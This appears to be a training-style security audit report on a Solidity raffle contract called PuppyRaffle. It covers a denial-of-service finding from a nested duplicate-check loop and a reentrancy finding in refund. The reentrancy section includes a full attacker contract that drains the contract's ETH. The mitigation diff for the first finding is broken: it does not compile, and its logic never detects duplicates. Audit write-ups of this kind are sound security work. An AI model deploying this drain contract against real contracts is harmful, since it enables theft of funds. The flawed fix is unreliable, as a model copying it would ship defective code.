### [M-1] Looping through the players array to check for duplicate in `PuppleRuffle::enterRaffle` could potentially lead to Denial of Service (DoS) attack, increasing gas cost in the future

**Description :** The `PuppleRuffle::enterRaffle` function includes a duplicate checking mechanism that loops through the `players` array. As the array lengthens, the increasing number of iterations required for duplicate checks can result in higher gas costs. Consequently, `players` who enter earlier may incur lower gas costs compared to those who enter later

**Impact :** The impact is two-fold.
1. The gas cost for raffle entrants will greatly increase as more players enter the raffle
2. Front running opportunities are created for malicious user to increase gas cost of other user, so their transaction fails. 

**Proof of Concepts :** If we have 2 sets of scenario for entrance the ruffle, first set contain 100 player as well as second set. 
- First scenario : 6252041
- Second scenario : 18068131

This due to the for loop in the `PuppleRuffle::enterRaffle` function : 

``` javascript
for (uint256 i = 0; i < players.length - 1; i++) {
          for (uint256 j = i + 1; j < players.length; j++) {
              require(players[i] != players[j], "PuppyRaffle: Duplicate player");
          }
      }
```

<details>

<summary> Proof of code </summary>

Place following test into `PuppleRuffleTest.t.sol`

```javascript
function test_denialOfServices() public {
      uint256 playersNum = 100;
      address[] memory playersAddress = new address[](playersNum);
      for(uint256 i; i<playersNum; i++){
          playersAddress[i] = address(i);
      }
      
      vm.txGasPrice(1);
      uint256 gasStart = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * playersAddress.length}(playersAddress);
      uint256 gasEnd = gasleft();

      uint256 gasUsedFirst = ((gasStart - gasEnd) * tx.gasprice);

      uint256 playersNumTwo = 100;
      address[] memory playersAddressTwo = new address[](playersNumTwo);
      for(uint256 i; i<playersNumTwo; i++){
          playersAddressTwo[i] = address(i + playersNumTwo);
      }
      
      vm.txGasPrice(1);
      uint256 gasStartTwo = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * playersAddressTwo.length}(playersAddressTwo);
      uint256 gasEndTwo = gasleft();
      uint256 gasUsedSecond = ((gasStartTwo - gasEndTwo) * tx.gasprice);
      
      console.log("gas used first 100 players ", gasUsedFirst);
      console.log("gas used second 100 players ", gasUsedSecond);

      assert(gasUsedFirst < gasUsedSecond);
  }

```

</details>


**Recommended mitigation :** There are a few recommendations.

1. consider allowing duplicates. Users can make a new wallet addresess anyways. so a duplicate checking doesn't prevent the same person from entering raffle multiple times. 
2. Consider using a mapping to check for duplicates. This allow constant time lookup of whether a user has already entered. 
```diff
+   mappings(address => bool) playersMappings;

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           playersMappings[newPlayers[i]] = true;
        }

-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
+       for (uint256 i = 0; i < players.length; i++){
+           require(playerMappings[i] == true, "Duplicate players");
+       }
        emit RaffleEnter(newPlayers); 
    }
```

### [H-1] Reentrancy Attack found in `PuppleRaffle::refund`, allowing attacker to steal the contract balance

**Description :** The `PuppleRaffle::refund` function is vulnerable to reentrancy due to its current design, potentially allowing an attacker to exploit the contract's state before executing the necessary state changes.

in the `PuppleRaffle::refund` function, we know that the function doing external call and then change the statement of contract.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);

@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

A player who has entered the raffle could have fallback/receive function to exploit the contract after player doing. Fallback/receive will execute recursively before state of the contract change and automatically steal all of ether.

**Impact :** In the worst-case scenario, an attacker could drain the entire ETH balance of the contract if successful, leading to a loss of all funds held by the `PuppleRaffle` contract.

**Vulnerability Explanation :**
The refund function allows a player to withdraw their entrance fee (`entranceFee`) by sending ETH back to `msg.sender`. However, this function does not follow the Checks-Effects-Interactions (CEI) pattern, which is crucial in preventing reentrancy attacks. After sending ETH (`sendValue`), the function changes the contract state (`players[playerIndex] = address(0);`). This sequence of operations allows an attacker to recursively call back into the contract before the state is updated, potentially stealing more ETH than they are entitled to.

**Proof of Concepts :** 
<details>

<summary> Code </summary>

```javascript

Contract PuppyRaffleTest is Test {
    ...
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function test_reentrancyRefund() public playersEntered {
        AttackerReentrancy attackerContract = new AttackerReentrancy(puppyRaffle);
        
        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        console.log("starting attack contract balance : ", startingAttackContractBalance);
        console.log("starting puppy raffle balance : ", startingPuppyRaffleBalance);

        attackerContract.attack{value: entranceFee}();
        
        uint256 endingAttackContractBalance = address(attackerContract).balance;
        uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;

        console.log("ending attack contract balance : ", endingAttackContractBalance);
        console.log("ending puppy raffle balance : ", endingPuppyRaffleBalance);
    }

}

contract AttackerReentrancy {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee ;
    uint256 attackerIndex;

    constructor(PuppyRaffle puppyRuffle_){
        puppyRaffle = puppyRuffle_;
        entranceFee = puppyRaffle.entranceFee();
    } 

    function attack() external payable {
        address[] memory addressContract = new address[](1);
        addressContract[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(addressContract);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if(address(puppyRaffle).balance > 0){
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable{
        _stealMoney();
    }

    receive() external payable{
        _stealMoney();
    }
}

```

The scenario is ...

</details>
**Recommended mitigation :** To avoid this problem, there are many ways such as using CEI pattern, using openzeppelin contract `ReentrancyGuard` as well, but i just show you how to implement CEI pattern for function `PuppleRaffle::refund`.

Before : 

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

After : 

```javascript
function refund(uint256 playerIndex) public {
    // Check
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Effect
    players[playerIndex] = address(0);

    // Interact
    payable(msg.sender).sendValue(entranceFee);    
    emit RaffleRefunded(playerAddress);
}
```